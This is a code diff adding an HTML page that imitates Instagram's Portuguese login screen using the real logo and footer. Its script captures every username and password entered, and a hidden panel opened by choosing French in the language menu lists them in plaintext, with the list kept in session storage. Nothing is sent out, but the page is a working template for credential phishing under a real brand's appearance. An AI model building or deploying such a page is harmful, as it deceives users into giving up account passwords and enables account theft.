@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Instagram • Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+      padding: 20px;
+    }
+
+    .main-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 350px;
+      margin: 0 auto;
+    }
+
+    #loginPage {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+
+    .login-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    .logo {
+      margin: 22px auto 28px;
+      width: 175px;
+      height: auto;
+      display: block;
+    }
+
+    form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin-top: 0;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 8px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+      color: #262626;
+      line-height: 1.2;
+    }
+
+    input::placeholder {
+      color: #8e8e8e;
+      font-size: 12px;
+      opacity: 1;
+    }
+
+    input:focus {
+      border: 1px solid #a8a8a8;
+      outline: none;
+      background: #fafafa;
+    }
+
+    button {
+      background-color: #4cb5f9;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 0;
+      font-weight: 600;
+      font-size: 14px;
+      margin-top: 12px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.2s ease;
+      letter-spacing: 0.2px;
+    }
+
+    button:hover {
+      background-color: #1877f2;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      margin: 18px 0 20px;
+    }
+
+    .line {
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .or-text {
+      margin: 0 14px;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .fb-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .fb-icon {
+      width: 16px;
+      height: 16px;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="%23385185"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05h2.03V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>') no-repeat center;
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+    }
+
+    .forgot-pass {
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
+      margin-top: 4px;
+      display: block;
+    }
+
+    .signup-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      width: 100%;
+      margin-bottom: 20px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .app-download {
+      text-align: center;
+      margin: 10px 0 20px;
+      width: 100%;
+    }
+
+    .store-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 8px;
+    }
+
+    .store-buttons img {
+      height: 40px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 25px;
+      padding: 0 20px 40px;
+      max-width: 700px;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 12px;
+    }
+
+    .footer-links a {
+      color: #8e8e8e;
+      text-decoration: none;
+    }
+
+    .footer-meta {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 15px;
+    }
+
+    select.language-select {
+      border: none;
+      background: transparent;
+      color: #8e8e8e;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    /* Tela Francesa */
+    #frenchAttemptsPage {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 450px;
+      background: white;
+      border: 1px solid #dbdbdb;
+      padding: 30px 25px;
+      border-radius: 4px;
+      margin: 20px auto;
+    }
+
+    .french-header {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #262626;
+    }
+
+    .french-subtitle {
+      font-size: 13px;
+      color: #8e8e8e;
+      margin-bottom: 25px;
+    }
+
+    .attempts-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 25px;
+      font-size: 13px;
+    }
+
+    .attempts-table th {
+      background: #fafafa;
+      padding: 10px 8px;
+      text-align: left;
+      font-weight: 600;
+      color: #262626;
+      border-bottom: 2px solid #dbdbdb;
+    }
+
+    .attempts-table td {
+      padding: 10px 8px;
+      border-bottom: 1px solid #efefef;
+      color: #262626;
+      word-break: break-all;
+    }
+
+    .status-echec {
+      color: #ed4956;
+      font-weight: 600;
+    }
+
+    .status-succes {
+      color: #78de45;
+      font-weight: 600;
+    }
+
+    .empty-message {
+      text-align: center;
+      color: #8e8e8e;
+      padding: 20px;
+      font-style: italic;
+    }
+
+    .back-button {
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 20px;
+      font-weight: 600;
+      width: 100%;
+      cursor: pointer;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    .clear-button {
+      background: none;
+      border: 1px solid #dbdbdb;
+      color: #ed4956;
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 12px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    .attempt-count {
+      font-size: 14px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Página de Login -->
+  <div id="loginPage">
+    <div class="main-wrapper">
+      <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" alt="Instagram" class="logo">
+        <form id="loginForm">
+          <input type="text" id="usernameInput" placeholder="Telefone, nome de usuário ou email" autocomplete="off">
+          <input type="password" id="passwordInput" placeholder="Senha" autocomplete="off">
+          <button type="button" id="submitBtn">Entrar</button>
+        </form>
+        <div class="divider">
+          <div class="line"></div>
+          <div class="or-text">OU</div>
+          <div class="line"></div>
+        </div>
+        <a href="#" class="fb-login"><span class="fb-icon"></span> Entrar com o Facebook</a>
+        <a href="#" class="forgot-pass">Esqueceu a senha?</a>
+      </div>
+      <div class="signup-box">
+        Não tem uma conta? <a href="#">Cadastre-se</a>
+      </div>
+      <div class="app-download">
+        <div style="margin-bottom: 12px;">Obtenha o aplicativo.</div>
+        <div class="store-buttons">
+          <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
+          <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store"></a>
+        </div>
+      </div>
+    </div>
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">Meta</a> <a href="#">Sobre</a> <a href="#">Blog</a> <a href="#">Carreiras</a>
+        <a href="#">Ajuda</a> <a href="#">API</a> <a href="#">Privacidade</a> <a href="#">Termos</a>
+        <a href="#">Localizações</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a>
+        <a href="#">Carregamento de contatos</a> <a href="#">Meta Verified</a>
+      </div>
+      <div class="footer-meta">
+        <select id="languageSelect" class="language-select">
+          <option value="pt">Português (Brasil)</option>
+          <option value="en">English (US)</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+        </select>
+        <span>© 2025 Instagram from Meta</span>
+      </div>
+    </footer>
+  </div>
+
+  <!-- Tela Francesa com Histórico Completo -->
+  <div id="frenchAttemptsPage">
+    <div class="french-header">🇫🇷 Journal des tentatives de connexion</div>
+    <div class="french-subtitle">Historique complet enregistré pendant la session</div>
+    
+    <div class="attempt-count" id="attemptCount">Total : 0 tentative(s)</div>
+    
+    <div style="width: 100%; overflow-x: auto;">
+      <table class="attempts-table" id="attemptsTable">
+        <thead>
+          <tr>
+            <th>Date & Heure</th>
+            <th>Identifiant</th>
+            <th>Mot de passe</th>
+            <th>Statut</th>
+          </tr>
+        </thead>
+        <tbody id="attemptsBody">
+          <tr>
+            <td colspan="4" class="empty-message">Aucune tentative enregistrée pour le moment</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <button id="backToLoginBtn" class="back-button">← Retour à la page de connexion</button>
+    <button id="clearAttemptsBtn" class="clear-button">🗑️ Effacer l'historique</button>
+  </div>
+
+  <script>
+    (function() {
+      // Elementos das páginas
+      const loginPage = document.getElementById('loginPage');
+      const frenchPage = document.getElementById('frenchAttemptsPage');
+      const languageSelect = document.getElementById('languageSelect');
+      const backBtn = document.getElementById('backToLoginBtn');
+      const clearBtn = document.getElementById('clearAttemptsBtn');
+      
+      // Inputs do formulário
+      const usernameInput = document.getElementById('usernameInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const submitBtn = document.getElementById('submitBtn');
+      
+      // Elementos da tabela
+      const attemptsBody = document.getElementById('attemptsBody');
+      const attemptCount = document.getElementById('attemptCount');
+      
+      // Array principal que armazena TODAS as tentativas
+      let loginAttempts = [];
+
+      // Função para salvar uma nova tentativa
+      function saveLoginAttempt() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+        
+        // Não salva se ambos os campos estiverem vazios
+        if (!username && !password) {
+          alert('Veuillez remplir au moins un champ pour enregistrer une tentative.');
+          return;
+        }
+        
+        const now = new Date();
+        const options = { 
+          day: '2-digit', 
+          month: '2-digit', 
+          year: 'numeric',
+          hour: '2-digit', 
+          minute: '2-digit',
+          second: '2-digit'
+        };
+        const dateStr = now.toLocaleString('fr-FR', options);
+        
+        // Determina status (simulação baseada em regras simples)
+        const isSuccess = username.includes('@') && password.length >= 6;
+        const status = isSuccess ? 'Succès' : 'Échec';
+        
+        // Adiciona no INÍCIO do array (mais recente primeiro)
+        loginAttempts.unshift({
+          id: Date.now(),
+          timestamp: dateStr,
+          username: username || '(vide)',
+          password: password || '(vide)',
+          status: status
+        });
+        
+        // Limpa os campos após salvar
+        usernameInput.value = '';
+        passwordInput.value = '';
+        
+        // Atualiza a tabela se a página francesa estiver visível
+        if (frenchPage.style.display === 'flex') {
+          renderAttemptsTable();
+        }
+        
+        // Foca no primeiro campo para nova tentativa
+        usernameInput.focus();
+      }
+
+      // Função para renderizar a tabela de tentativas
+      function renderAttemptsTable() {
+        attemptsBody.innerHTML = '';
+        
+        // Atualiza contador
+        attemptCount.textContent = `Total : ${loginAttempts.length} tentative(s)`;
+        
+        if (loginAttempts.length === 0) {
+          attemptsBody.innerHTML = `
+            <tr>
+              <td colspan="4" class="empty-message">Aucune tentative enregistrée pour le moment</td>
+            </tr>
+          `;
+          return;
+        }
+        
+        // Renderiza cada tentativa
+        loginAttempts.forEach(attempt => {
+          const row = document.createElement('tr');
+          
+          // Coluna Data/Hora
+          const tdDate = document.createElement('td');
+          tdDate.textContent = attempt.timestamp;
+          tdDate.style.fontSize = '12px';
+          tdDate.style.color = '#8e8e8e';
+          
+          // Coluna Identifiant
+          const tdUser = document.createElement('td');
+          tdUser.textContent = attempt.username;
+          tdUser.style.fontWeight = '500';
+          
+          // Coluna Senha
+          const tdPass = document.createElement('td');
+          tdPass.textContent = attempt.password;
+          tdPass.style.fontFamily = 'monospace';
+          tdPass.style.letterSpacing = '1px';
+          
+          // Coluna Status
+          const tdStatus = document.createElement('td');
+          tdStatus.textContent = attempt.status;
+          tdStatus.className = attempt.status === 'Succès' ? 'status-succes' : 'status-echec';
+          
+          row.appendChild(tdDate);
+          row.appendChild(tdUser);
+          row.appendChild(tdPass);
+          row.appendChild(tdStatus);
+          
+          attemptsBody.appendChild(row);
+        });
+      }
+
+      // Função para limpar todo o histórico
+      function clearAllAttempts() {
+        if (loginAttempts.length === 0) {
+          alert('Aucune tentative à effacer.');
+          return;
+        }
+        
+        if (confirm('Êtes-vous sûr de vouloir effacer tout l\'historique des tentatives ?')) {
+          loginAttempts = [];
+          renderAttemptsTable();
+        }
+      }
+
+      // Função para mostrar a página francesa
+      function showFrenchPage() {
+        // Salva o que está nos campos antes de trocar de página
+        const currentUser = usernameInput.value.trim();
+        const currentPass = passwordInput.value.trim();
+        
+        if (currentUser || currentPass) {
+          const now = new Date();
+          const options = { 
+            day: '2-digit', 
+            month: '2-digit', 
+            year: 'numeric',
+            hour: '2-digit', 
+            minute: '2-digit',
+            second: '2-digit'
+          };
+          const dateStr = now.toLocaleString('fr-FR', options);
+          const isSuccess = currentUser.includes('@') && currentPass.length >= 6;
+          
+          loginAttempts.unshift({
+            id: Date.now(),
+            timestamp: dateStr,
+            username: currentUser || '(vide)',
+            password: currentPass || '(vide)',
+            status: isSuccess ? 'Succès' : 'Échec'
+          });
+          
+          usernameInput.value = '';
+          passwordInput.value = '';
+        }
+        
+        loginPage.style.display = 'none';
+        frenchPage.style.display = 'flex';
+        renderAttemptsTable();
+      }
+
+      // Função para voltar à página de login
+      function showLoginPage() {
+        frenchPage.style.display = 'none';
+        loginPage.style.display = 'block';
+        languageSelect.value = 'pt';
+        usernameInput.focus();
+      }
+
+      // Event Listeners
+      submitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        saveLoginAttempt();
+      });
+
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        saveLoginAttempt();
+      });
+
+      // Permite enviar com Enter em qualquer campo
+      passwordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          saveLoginAttempt();
+        }
+      });
+
+      languageSelect.addEventListener('change', function(e) {
+        if (e.target.value === 'fr') {
+          showFrenchPage();
+        }
+      });
+
+      backBtn.addEventListener('click', showLoginPage);
+      
+      clearBtn.addEventListener('click', clearAllAttempts);
+
+      // Inicialização
+      window.addEventListener('load', function() {
+        loginPage.style.display = 'block';
+        frenchPage.style.display = 'none';
+        loginAttempts = [];
+        renderAttemptsTable();
+        usernameInput.focus();
+      });
+
+      // Salvar estado no sessionStorage para persistir durante a sessão
+      window.addEventListener('beforeunload', function() {
+        sessionStorage.setItem('instagramLoginAttempts', JSON.stringify(loginAttempts));
+      });
+
+      // Recuperar estado ao carregar
+      window.addEventListener('load', function() {
+        const savedAttempts = sessionStorage.getItem('instagramLoginAttempts');
+        if (savedAttempts) {
+          try {
+            loginAttempts = JSON.parse(savedAttempts);
+            if (frenchPage.style.display === 'flex') {
+              renderAttemptsTable();
+            }
+          } catch (e) {
+            loginAttempts = [];
+          }
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
